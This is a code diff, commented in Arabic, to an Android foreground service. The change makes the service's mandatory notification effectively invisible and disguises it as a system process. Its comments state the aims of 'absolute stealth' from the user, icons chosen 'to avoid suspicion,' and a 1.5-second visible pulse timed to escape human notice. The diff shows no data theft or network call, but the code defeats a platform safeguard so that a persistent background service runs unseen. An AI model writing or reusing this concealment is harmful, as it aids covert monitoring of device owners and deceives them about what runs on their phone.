@@ -1,5 +1,6 @@
 package com.example.app
 
+import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
@@ -7,23 +8,27 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 
 /**
  * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" دائم.
  *
- * استراتيجية التخفي المتقدمة (Stealth Ghost Notification):
+ * استراتيجية النبض الشبحي (Ghost Pulse):
  * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
  * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
- * - أيقونة نظامية عامة (stat_sys_data_bluetooth) لتجنب الشك
+ * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 1.5 ثانية ثم يعود للشبحية
+ * - أيقونة نظامية عامة (ic_popup_sync أو ic_menu_compass) لتجنب الشك
  * - إخفاء المحتوى من شاشة القفل
  * - لا يتم إلغاء الإشعار نهائياً للحفاظ على حالة "الأمامية" للخدمة
  *   (إلغاء الإشعار قد يؤدي إلى قتل الخدمة على أندرويد 10+)
  *
  * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
  * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
+ * ✅ تحقيق "الظهور والاختفاء" دون تعطيل الخدمة
  * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
  *   باستخدام startForeground مع النوع الصحيح (FOREGROUND_SERVICE_TYPE_DATA_SYNC)
  *   وإبقاء الإشعار حياً بشكل شبحى (غير مرئي)
@@ -36,7 +41,15 @@ class ForegroundService : Service() {
         private const val TAG = "ForegroundService"
     }
 
+    private var isForeground = false
+    private lateinit var notificationManager: NotificationManager
+    private val mainHandler = Handler(Looper.getMainLooper())
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
         // إيقاف الخدمة إذا طُلب ذلك
         if (intent?.action == "STOP_SERVICE") {
             stopForeground(STOP_FOREGROUND_REMOVE)
@@ -44,50 +57,66 @@ class ForegroundService : Service() {
             return START_NOT_STICKY
         }
 
-        // ✅ بدء الخدمة كـ Foreground مع إشعار شبحى دائم
-        startGhostForeground()
+        // ✅ نبض: عند استلام أمر، يظهر الإشعار لـ 1.5 ثانية ثم يعود للشبحية
+        if (intent?.action == "PULSE_ACTION") {
+            startGhostForeground(isPulse = true)
+            mainHandler.postDelayed({
+                startGhostForeground(isPulse = false)
+            }, 1500) // 1.5 ثانية كافية ليظهر ويختفي دون ملاحظة بشرية
+            return START_STICKY
+        }
+
+        if (!isForeground) {
+            startGhostForeground(isPulse = false)
+        }
 
         return START_STICKY
     }
 
     /**
-     * بدء الخدمة الأمامية مع إشعار شبحى دائم.
-     * يتم إنشاء قناة إشعار بأدنى أولوية ممكنة (IMPORTANCE_MIN)
-     * مما يجعل الإشعار غير مرئي تماماً في شريط الحالة.
-     * لا يتم إلغاء الإشعار للحفاظ على حالة "الأمامية" للخدمة.
+     * بدء الخدمة الأمامية مع إشعار شبحى أو نبض مؤقت.
+     * @param isPulse true: إشعار مرئي مؤقت، false: إشعار شبحى دائم
      */
-    private fun startGhostForeground() {
+    private fun startGhostForeground(isPulse: Boolean) {
         try {
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            // ✅ تبديل الأولوية: MIN للشبحية، DEFAULT للنبض المؤقت
+            val importance = if (isPulse) {
+                NotificationManager.IMPORTANCE_DEFAULT
+            } else {
+                NotificationManager.IMPORTANCE_MIN
+            }
 
-            // ✅ إنشاء قناة الإشعارات بأدنى أولوية ممكنة
+            // ✅ إنشاء قناة الإشعارات (أو تحديثها) حسب الأولوية
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 val channel = NotificationChannel(
                     CHANNEL_ID,
                     "System Core",
-                    NotificationManager.IMPORTANCE_MIN // أدنى أولوية مرئية
+                    importance
                 ).apply {
                     description = "Background system operations"
                     setShowBadge(false)
                     enableVibration(false)
                     setSound(null, null)
-                    lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
-                    setBypassDnd(false)
-                    enableLights(false)
+                    lockscreenVisibility = Notification.VISIBILITY_SECRET
+                    if (!isPulse) {
+                        setBypassDnd(false) // إخفاء تام في وضع السكون
+                        enableLights(false)
+                    }
                 }
                 notificationManager.createNotificationChannel(channel)
-                Log.d(TAG, "✅ Ghost notification channel created")
+                Log.d(TAG, "✅ Notification channel created (pulse=$isPulse)")
             }
 
-            // ✅ بناء إشعار شبحى (فارغ، بدون صوت، بدون اهتزاز)
+            // ✅ بناء الإشعار
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("")
-                .setContentText("")
-                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .setOngoing(true) // ✅ ضروري لمنع قتل الخدمة
-                .setSilent(true)
+                .setContentTitle(if (isPulse) "System Syncing..." else "System")
+                .setContentText(if (isPulse) "Processing secure task" else "")
+                .setSmallIcon(if (isPulse) android.R.drawable.ic_popup_sync else android.R.drawable.ic_menu_compass)
+                .setPriority(if (isPulse) NotificationCompat.PRIORITY_DEFAULT else NotificationCompat.PRIORITY_MIN)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setShowWhen(false)
+                .setOngoing(true) // ✅ أساسي 100%: يمنع النظام من قتل الخدمة
+                .setSilent(true)
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .build()
 
@@ -98,8 +127,11 @@ class ForegroundService : Service() {
                 startForeground(NOTIF_ID, notification)
             }
 
-            MainActivity.appendLogStatic("✅ Ghost notification started (permanent invisible)")
-            Log.d(TAG, "✅ Ghost notification started (permanent invisible)")
+            isForeground = true
+
+            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible)" else "✅ Ghost notification started (permanent invisible)"
+            MainActivity.appendLogStatic(logMsg)
+            Log.d(TAG, logMsg)
 
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
@@ -107,9 +139,8 @@ class ForegroundService : Service() {
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
     override fun onDestroy() {
+        isForeground = false
         super.onDestroy()
         Log.d(TAG, "ForegroundService destroyed")
         MainActivity.appendLogStatic("🛑 ForegroundService destroyed")
